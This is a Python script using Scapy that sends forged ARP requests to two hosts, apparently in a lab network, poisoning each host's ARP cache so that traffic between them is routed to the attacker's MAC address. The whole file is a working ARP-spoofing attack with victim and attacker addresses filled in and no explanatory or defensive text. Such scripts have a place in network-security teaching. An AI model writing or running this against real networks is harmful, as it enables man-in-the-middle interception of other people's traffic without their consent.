#!/usr/bin/env python3
from scapy.all import *

# Fake details
VICTIM_IP = "10.9.0.5"      # Target IP (who will get poisoned)
TARGET_MAC = "02:42:0a:09:00:05"  # MAC of the target (victim)
FAKE_IP = "10.9.0.7"        # Pretend to be this IP
ATTACKER_MAC = "02:42:0a:09:00:06"

# Fake details 2
VICTIM_IP2 = "10.9.0.7"      # Target IP (who will get poisoned)
TARGET_MAC2 = "02:42:0a:09:00:07"  # MAC of the target (victim)
FAKE_IP2 = "10.9.0.5"        # Pretend to be this IP
ATTACKER_MAC2 = "02:42:0a:09:00:06"

print("SENDING SPOOFED ARP REQUEST...")

# Craft Ethernet Frame
ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=ATTACKER_MAC)

# Craft ARP Request
arp = ARP()
arp.op = 1  # 1 = ARP Request
arp.hwsrc = ATTACKER_MAC
arp.psrc = FAKE_IP
arp.pdst = VICTIM_IP
arp.hwdst = "00:00:00:00:00:00"  # Standard for ARP Request

# Combine and send
packet = ether / arp
sendp(packet, iface="eth0", verbose=False)

#---------------Sending Spoofed pkt to other system

# Craft Ethernet Frame
ether2 = Ether(dst="ff:ff:ff:ff:ff:ff", src=ATTACKER_MAC2)

# Craft ARP Request
arp2 = ARP()
arp2.op = 1  # 1 = ARP Request
arp2.hwsrc = ATTACKER_MAC2
arp2.psrc = FAKE_IP2
arp2.pdst = VICTIM_IP2
arp2.hwdst = "00:00:00:00:00:00"  # Standard for ARP Request

# Combine and send
packet2 = ether2 / arp2
sendp(packet2, iface="eth0", verbose=False)
